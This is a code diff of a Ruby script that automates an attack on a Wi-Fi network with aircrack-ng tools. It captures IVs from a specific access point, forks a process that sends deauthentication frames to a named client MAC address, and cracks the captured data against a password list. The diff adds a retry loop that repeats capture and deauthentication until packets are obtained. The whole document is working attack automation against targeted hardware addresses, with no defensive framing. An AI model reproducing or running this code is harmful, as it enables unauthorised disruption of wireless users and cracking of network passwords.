@@ -12,40 +12,50 @@ monitoring_stopper(airmon_parser)
 monitoring_starter(airmon_parser)
 # Starts mon0 for the chosen wlan
 
-p = IO.popen("sudo airodump-ng mon0 --bssid 00:1D:7E:FB:38:80 -c 11 -w replay --ivs")
+again = true
 
-
-fork do 
-	sleep(2)
-	5.times do
-		if !system("sudo aireplay-ng -0 1 -a 00:1D:7E:FB:38:80 -c 1C:65:9D:0C:FE:02 mon0")
-			monitoring_stopper()
-			cleaner()
-			abort("\nAttack fail!")
-		end
-		sleep(4)
-	end
-end
-
-
-pid = p.pid
-n = 23
-sleep(n)
-Process.kill("INT", pid)
-
-
-
-if !system("sudo aircrack-ng -w pass.lst replay-01.ivs")
-	monitoring_stopper()
+while again do
+	
+	again = false	
 	cleaner()
-	abort("\nCracker fail!")
-end
+	# Deletes all iv-s and txt-s
+	
+	p = IO.popen("sudo airodump-ng mon0 --bssid 00:1D:7E:FB:38:80 -c 11 -w replay --ivs")
 
+
+	fork do 
+		sleep(0.5)
+		2.times do
+			if !system("sudo aireplay-ng -0 1 -a 00:1D:7E:FB:38:80 -c 1C:65:9D:0C:FE:02 mon0")
+				monitoring_stopper()
+				cleaner()
+				abort("\nAttack fail!")
+			end
+			sleep(1)
+		end
+	end
+
+
+	pid = p.pid
+	n = 4
+	sleep(n)
+	Process.kill("INT", pid)
+
+	a = `sudo aircrack-ng -w pass.lst replay-01.ivs`
+
+	if !system("sudo aircrack-ng -w pass.lst replay-01.ivs")
+		monitoring_stopper()
+		cleaner()
+		abort("\nCracker fail!")
+	elsif a =~ /no data packets/
+		again = true
+	end
+
+end
 
 monitoring_stopper(airmon_parser)
 # Stops all mons and wlans
 
 cleaner()
 # Deletes all iv-s and txt-s
-
 
